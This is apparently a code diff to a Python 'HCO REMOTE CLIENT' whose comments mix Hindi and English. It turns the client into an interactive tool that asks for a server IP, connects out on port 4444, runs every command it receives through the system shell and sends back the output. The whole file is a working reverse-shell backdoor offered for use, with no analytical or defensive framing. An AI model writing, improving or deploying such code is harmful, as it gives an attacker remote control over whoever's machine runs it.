@@ -2,34 +2,41 @@ import socket
 import subprocess
 
 def run_client():
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print("""
+    =========================================
+          HCO REMOTE CLIENT (Interactive)    
+    =========================================
+    """)
     
-    # Yahan apne server ka IP daalna. Testing ke liye '127.0.0.1' rakh sakte ho.
-    server_ip = '127.0.0.1'
+    # User se dynamic IP mangega
+    server_ip = input("[?] Enter Server IP (e.g., 192.168.1.10): ").strip()
     port = 4444
+    
+    print(f"[*] Connecting to server at {server_ip}:{port}...")
+    
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     try:
         client.connect((server_ip, port))
+        print("[+] Connected to Server Successfully!\n")
     except Exception as e:
+        print(f"[-] Connection failed: {e}")
         return
-
+    
     while True:
         try:
-            command = client.recv(1024).decode('utf-8')
-            if command.lower() == 'exit':
+            command = client.recv(1024).decode()
+            if not command or command.lower() == 'exit':
                 break
             
+            # Command execute karke output bhejna
             output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
         except Exception as e:
-            output = str(e).encode('utf-8')
+            output = str(e).encode()
             
-        try:
-            client.send(output)
-        except:
-            break
+        client.send(output)
         
     client.close()
 
 if __name__ == "__main__":
     run_client()
-  
